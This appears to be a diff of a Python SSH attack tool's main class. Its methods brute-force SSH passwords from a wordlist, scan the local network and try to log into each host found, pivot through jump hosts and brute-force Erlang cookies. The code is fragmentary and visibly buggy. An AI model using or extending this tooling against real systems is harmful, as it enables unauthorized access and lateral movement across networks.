@@ -20,20 +20,14 @@ interfaces = netifaces.interfaces()
 addrs = netifaces.ifaddresses(str(interfaces[0]))
 # add
 #exploits.exploits().get_connect()
-class main:
-    def __init__(self, multithreading, save_file, log_errs, log_suc, myfile):
+class main(connect_listen.connect_listen):
+    def __init__(self, hostname, port, username, password, multithreading, logs, myfile, passfile):
+        super().__init__(hostname, port, username , password)
         self.multithreading = multithreading
-        self.save_file = save_file
-        self.log_errs = log_errs
-        self.log_suc = log_suc
+        self.logs = logs
         self.myfile = open("network.txt", "r+")
+        self.passfile = open("pass.txt", "r+")
 
-
-
-    #def get_main(self, multithreading = None , save_file = None, log_errs = None, log_suc = None):
-     # outer_c = main.main(multithreading = None , save_file = None, log_errs = None, log_suc = None)
-      #return outer_c
-#MAKE CODE LESS SPAGHETTI!!!
 
 
     def interface_get(self):
@@ -42,22 +36,18 @@ class main:
       print(addrs[netifaces.AF_INET])
       print(addrs[netifaces.AF_LINK])
 
-    def open_two_terminals(self):
-     proc1 = subprocess.Popen(['gnome-terminal', '-x', 'python', '__init__.py'])
-     proc2 = subprocess.Popen(['gnome-terminal', '-x', 'python', '__init__.py'])
-     proc1.wait()
-     proc2.wait()
-
-
 
     def connect_normal(self):
-     outer = connect_listen.connect_listen(hostname=input("hostname: "), username=input("username: "), password=input("password: "), port = 22)
-     outer.ssh_connect(pkey = None)
-     outer.set_connect()
-     print(outer.get_connect)
+     print(f'connecting to {self.hostname}')
+     try:
+      connect_listen.connect_listen.ssh_connect(self, pkey = None)
+     except:
+      print("error")
 
     def hexdump(self):
-     connect_listen.connect_listen(hostname = input("hostname: "), username = input("username: "), password = input("password: "), port = 22).inbound()
+     connect_listen.connect_listen.socket_in()
+     connect_listen.connect_listen.socket_transport()
+     connect_listen.connect_listen._hexdump()
 
     def bruteforce(self):
      print("... bruteforcing into")
@@ -65,18 +55,15 @@ class main:
      #outer_c = main(multithreading = None , save_file = None, log_errs = None, log_suc = None, myfile = "pass.txt")
 
      #myline = outer_c.read_brute()
-     hostname = input('hostname')
-     username = input('username')
      my_line = self.myfile.readline()
-     while myline:
-        connect_listen.connect_listen(hostname = hostname, username = username, password = myfile.readline(), port = 22).ssh_connect(pkey= None)
+     while my_line:
+        connect_listen.connect_listen.ssh_connect(self, self.myfile.readline(), pkey = None)
 
     def testing_preferences(self):
-      print("... reading all preferences")
       print("... requesting all preferences")
-      my_line = myfile.readline()
+      my_line = self.myfile.readline()
       while my_line:
-         connect_listen.connect_listen(hostname = hostname, username = username, password = password, port = 22).preference(_key = myfile.readline)
+         connect_listen.connect_listen.preference(self, _pubkeys = self.myfile.readline(), _key = self.myfile.readline(), _compression = self.myfile.readline(), _kex = self.myfile.readline(), _macs = self.myfile.readline())
 
 
     def connect_auth_no_cred(self):
@@ -84,9 +71,7 @@ class main:
       connect_listen.connect_listen(hostname = input("hostname: "), username = input("username: "), password = None, port = 22).auth()
 
     def connect_pkey(self):
-     dir_pkey = os.path.dirname("~/. ssh/id_rsa")
-     print(dir_pkey)
-     connect_listen.connect_listen(hostname = input("hostname: "), username = input("username: "), password = input("password: "), port = 22).ssh_connect(pkey = dir_pkey)
+     connect_listen.connect_listen.ssh_connect(self, None, self.get_keyfile())
 
     def show_connections(self):
       print("[+] connections")
@@ -100,7 +85,6 @@ class main:
      #print(subprocess.check_output(['bash', 'discover.sh']))
      self.myfile.truncate(0)
      subprocess.check_output(['bash', 'discover.sh'], shell = True)
-     print("")
      print("[+]reading network done [+] connecting")
 
      my_line = self.myfile.readline()
@@ -108,18 +92,31 @@ class main:
      while my_line:
       try:
        print(f'Connecting{self.myfile.readline()}')
-       connect_listen.connect_listen(hostname = my_line, username = input("username: "), password = input("password: "), port = 22).ssh_connect(pkey = None)
+       connect_listen.connect_listen().ssh_connect(passwords = self.myfile.readline(), pkey = self.get_keyfile() )
       except:
         print(f'Connection Failed { self.myfile.readline() }')
         break
 
     def _jumphosts(self):
-     print("JUMPING HOST")
-     connect_listen.connect_listen(hostname = "127.0.0.1", username = "root", password = "pass", port = 22).jump_hosts("127.0.0.1", "jump")
+     print("[+] Jumping Host")
+     connect_listen.connect_listen.jump_hosts(self,_jumphost = self.myfile.readline(), _jumppass = self.myfile.readline() )
+     print(f'[+] Going Through {_jumphost} with {_jumppass}')
 
+    def _cookie_bruteforce(self):
+     #connect_listen.connect_listen()
+     myline = self.myfile.readline()
+     while myline:
+      try:
+       exploits.exploits().erlangcookie(self.myfile.readline())
+      except:
+          pass
+    def handshake(self):
+     connect_listen.connect_listen.socket_transport(self)
+     connect_listen.connect_listen.capture_handshake(self)
+
+    def info(self):
+     exploits.exploits().info_dump()
 
     def read_config(self):
      print(f'[+] multithreading {self.multithreading}')
-     print(f'[+] logging known hosts {self.log_suc}')
-     print(f'[+] logging all errors {self.log_errs}')
-
+     print(f'[+] logging  {self.logs}')
